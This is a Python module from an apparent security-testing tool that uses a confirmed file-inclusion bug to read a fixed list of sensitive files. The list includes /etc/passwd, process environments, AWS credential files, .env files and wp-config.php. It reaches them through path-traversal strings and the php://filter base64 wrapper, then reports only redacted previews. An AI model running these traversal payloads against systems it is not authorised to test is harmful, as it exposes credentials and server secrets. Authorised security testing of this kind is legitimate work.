"""Bounded, read-only data extraction from a proven primitive.

Detection answers "can I?"; this answers "what is behind it?" without turning a
bug report into a data breach. Two rules keep it proportionate:

  * only fixed, high-value files are requested (no directory walking, no glob
    guessing), and only through a parameter that already proved file inclusion;
  * extracted content is never stored raw and never returned in full: markers,
    byte counts and *redacted* previews are what leave this module. A leaked
    credential becomes `{"type": "aws_access_key", "redacted": "AKIA…"}`.

The SQL side is delegated to sqlmap's metadata mode (`--banner`, `--current-db`,
`--dbs`), which proves database access and privileges without dumping rows.
"""

from __future__ import annotations

import base64
import re
from urllib.parse import parse_qsl, urlencode, urlparse

from core.validators import extract_secrets, inject_param, redact_for_log

# Fixed list: files whose disclosure is unambiguous and does not require
# guessing a deployment layout.
LFI_FILES = (
    "/etc/passwd",
    "/etc/hostname",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/root/.aws/credentials",
    "/home/ubuntu/.aws/credentials",
    "/var/www/html/.env",
    "/var/www/html/wp-config.php",
    "/var/www/html/config.php",
    "/app/.env",
    "/.env",
)

WIN_FILES = (
    "C:/Windows/win.ini",
    "C:/inetpub/wwwroot/web.config",
)

_PHP_FILES = (".php",)

_MARKERS = {
    "/etc/passwd": (r"root:.*?:0:0:",),
    "win.ini": (r"\[(?:fonts|extensions|mci extensions)\]",),
    ".aws/credentials": (r"aws_access_key_id", r"aws_secret_access_key"),
    ".env": (r"^[A-Z][A-Z0-9_]{2,}=",),
    "wp-config.php": (r"DB_PASSWORD", r"DB_NAME"),
    "config.php": (r"DB_PASSWORD", r"DB_NAME", r"password"),
    "/etc/hosts": (r"^\s*127\.0\.0\.1\s+localhost",),
    "cmdline": (r"\x00",),
    "environ": (r"^PATH=",),
}

_HTML = re.compile(r"<!doctype|<html|<head|<body", re.I)


def _dedupe(url: str, param: str, value: str) -> str:
    """Replace the parameter's value in place; appending leaves a first value
    that some servers prefer, which silently defeats the read."""
    if f"{{{param}}}" in url:
        return inject_param(url, param, value)
    parsed = urlparse(url)
    kept = [(k, v) for k, v in parse_qsl(parsed.query, keep_blank_values=True)
            if k != param]
    kept.append((param, value))
    return parsed._replace(query=urlencode(kept, doseq=True)).geturl()


def _traverse(path: str, depth: int = 10) -> str:
    return "../" * depth + path.lstrip("/")


def _probes(path: str) -> list:
    probes = [("traversal", _traverse(path))]
    if path.endswith(_PHP_FILES):
        # Source disclosure: the wrapper base64-encodes the file so the PHP
        # engine cannot execute it before it reaches us.
        probes.insert(0, ("php-filter",
                          "php://filter/convert.base64-encode/resource=" + path))
    return probes


def _markers_for(path: str) -> tuple:
    for needle, markers in _MARKERS.items():
        if needle in path:
            return markers
    return ()


def _decode_php_filter(body: str) -> str:
    """Decode a base64 source disclosure, if the response is one."""
    compact = re.sub(r"\s+", "", body or "")
    if len(compact) < 16 or not re.fullmatch(r"[A-Za-z0-9+/=]+", compact):
        return ""
    try:
        decoded = base64.b64decode(compact, validate=True)
    except Exception:
        return ""
    try:
        text = decoded.decode("utf-8", errors="replace")
    except Exception:
        return ""
    return text if text.strip() else ""


def _content_markers(text: str, markers: tuple) -> list:
    found = []
    for marker in markers:
        if re.search(marker, text, re.I | re.M):
            found.append(marker)
    return found


async def read_files(url: str, param: str, *, method: str = "GET",
                     headers: dict | None = None, files=None,
                     max_bytes: int = 4000, fetch=None) -> dict:
    """Read a fixed list of high-value files through an inclusion parameter.

    `fetch` is injected for tests: `fetch(url) -> {"status", "body", ...}`.
    """
    from tools.wrappers import curl

    fetch = fetch or (lambda target: curl(
        target, method=method, headers=headers or {}, output="full",
        follow_redirects=False))

    files = tuple(files or (LFI_FILES + WIN_FILES))
    results = []
    for path in files:
        markers = _markers_for(path)
        for label, probe in _probes(path):
            raw = await fetch(_dedupe(url, param, probe))
            body = str((raw or {}).get("body") or "")
            if not body:
                continue
            if _HTML.search(body) and not markers:
                continue
            text = body
            if label == "php-filter":
                decoded = _decode_php_filter(body)
                if not decoded:
                    continue
                text = decoded
            found = _content_markers(text, markers)
            if not found:
                continue
            secrets = [
                {"type": item.get("type", ""),
                 "redacted": item.get("redacted", "")}
                for item in extract_secrets(text)
            ]
            results.append({
                "path": path,
                "technique": label,
                "markers": found,
                "bytes": len(text),
                "secrets": secrets,
                # Never the raw file: redacted, truncated, and only after the
                # marker proved the read.
                "preview": redact_for_log(text[:max_bytes]),
            })
            break
    return {"files": results, "count": len(results)}


def summarize_extraction(result: dict) -> str:
    """One-line impact statement for evidence/finding text."""
    files = (result or {}).get("files") or []
    if not files:
        return "no high-value file readable"
    names = ", ".join(item["path"] for item in files[:6])
    secret_count = sum(len(item.get("secrets") or []) for item in files)
    return (f"{len(files)} file(s) readable ({names})"
            + (f", {secret_count} credential-shaped value(s)" if secret_count else ""))
